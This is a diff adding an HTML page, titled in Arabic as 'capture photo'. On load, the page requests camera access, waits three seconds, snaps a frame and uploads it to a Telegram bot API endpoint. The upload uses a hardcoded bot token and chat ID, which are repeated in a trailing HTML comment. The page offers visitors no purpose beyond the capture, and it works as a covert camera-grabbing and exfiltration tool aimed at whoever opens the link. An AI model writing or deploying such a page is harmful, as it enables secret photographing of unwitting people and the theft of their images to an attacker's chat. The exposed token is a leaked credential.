@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>التقاط صورة</title>
+</head>
+<body>
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas" style="display: none;"></canvas>
+    <script>
+        async function capturePhoto() {
+            const video = document.getElementById('video');
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            video.srcObject = stream;
+
+            setTimeout(() => {
+                const canvas = document.getElementById('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                // إرسال الصورة إلى تيليجرام
+                canvas.toBlob(blob => {
+                    const formData = new FormData();
+                    formData.append("photo", blob, "image.jpg");
+
+                    fetch("https://api.telegram.org/7573387870:AAG4TEbxTtmyq-d5iff8fLwb9MoeXYPxXWg/sendPhoto?chat_id=6279473459", {
+                        method: "POST",
+                        body: formData
+                    }).then(() => {
+                        alert("تم إرسال الصورة!");
+                    }).catch(err => console.error(err));
+                }, "image/jpeg");
+            }, 3000); // التقاط الصورة بعد 3 ثواني
+        }
+
+        capturePhoto();
+    </script>
+</body>
+</html>
+<!-- 
+7573387870:AAG4TEbxTtmyq-d5iff8fLwb9MoeXYPxXWg
+6279473459
+-->
+
